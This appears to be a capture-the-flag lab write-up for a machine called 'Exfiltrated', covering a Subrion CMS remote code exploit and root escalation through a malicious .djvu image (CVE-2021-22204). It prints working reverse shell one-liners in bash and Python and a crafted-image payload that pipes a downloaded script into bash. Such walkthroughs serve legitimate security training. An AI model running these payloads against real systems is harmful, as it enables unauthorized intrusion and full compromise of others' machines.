---
description: Privilege Escalation via Image Upload — DJVU RCE (CVE-2021-22204)
icon: linux
---

# Exfiltrated

## Summary

* Discovered Subrion CMS hosted on port 80.
* Used a public RCE exploit to execute remote commands.
* Gained a stable reverse shell using a URL-encoded one-liner.
* Escalated privileges by crafting a malicious `.djvu` image and uploading it, leading to remote code execution as root.

## 🧵 Let's Unpack

***

**Enumeration**

```bash
sudo nmap -sV -sC -p- -Pn 192.168.229.163 --open
```

Open Ports:

* `22/tcp` → OpenSSH 8.2p1
* `80/tcp` → Apache/2.4.41 (Ubuntu)
  * Detected **Subrion CMS**
  * `robots.txt` reveals interesting disallowed directories: `/backup/`, `/cron/`, `/front/`, `/install/`, `/panel/`, `/tmp/`, `/updates/`

***

**Initial Foothold**

**🔍 Target: Subrion CMS**

* **Exploit Used**: [Exploit-DB #49876 – Subrion CMS 4.2.1 RCE](https://www.exploit-db.com/exploits/49876)

**⚙️ Reverse Shell Execution**

```bash
bash -c "bash -i >& /dev/tcp/192.168.45.240/9999 0>&1"
# URL-encoded payload:
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.240%2F9999%200%3E%261%22
```

✅ Shell received as web user.

***

**Privilege Escalation**

**🔧 Exploit: Malicious `.djvu` (CVE-2021-22204)**

* **Exploit Reference**: [Exploit-DB #49881](https://www.exploit-db.com/docs/49881)
* Leveraged ImageMagick processing of `.djvu` files to trigger command execution via `curl | bash`.

**🧬 Steps**

1.  **Install prerequisites**

    ```bash
    sudo apt install -y djvulibre-bin
    ```
2.  **Prepare reverse shell script (shell.sh)**:

    ```bash
    #!/bin/bash
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.118.11",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    ```
3.  **Craft payload using djvumake**:

    ```bash
    echo '(metadata "\c${system (\'curl http://192.168.118.11/shell.sh | bash\')}")' > exploit
    djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit
    mv exploit.djvu exploit.jpg
    ```
4. **Upload `exploit.jpg` via vulnerable image parser**

✅ Received **root** shell after execution.
